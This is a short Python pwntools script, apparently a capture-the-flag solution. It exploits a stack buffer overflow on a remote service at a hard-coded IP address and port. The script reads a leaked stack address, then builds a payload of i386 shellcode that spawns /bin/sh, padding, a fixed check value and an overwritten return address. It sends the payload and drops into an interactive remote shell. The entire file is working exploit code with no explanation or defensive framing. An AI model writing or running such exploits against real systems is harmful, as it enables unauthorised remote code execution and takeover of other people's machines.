from pwn import *                                                                                                          
from struct import pack                                                                                                    
                                                                                                                           
sh = remote('52.15.182.55',12345)                                                                                          
shellcode = asm(shellcraft.i386.linux.sh())
value = 0xdeadbeef                                                                                                         
sh.recvuntil('0x')                                                                                                         
ret_address = int("0x" + sh.recv(8), 16)                                                                                                   
print(hex(ret_address))                                                                                                                           

payload = shellcode                                                                                                        
payload += "A"*20                                                                                                          
payload += p32(value)                                                                                                      
payload += "B"*8                                                                                                           
print(pack('<I', ret_address))
print(p32(ret_address))
payload += pack('<I', ret_address)                                                                                                                           
print(payload)                                                                                                
sh.sendline(payload)                                                                                                       
sh.interactive()
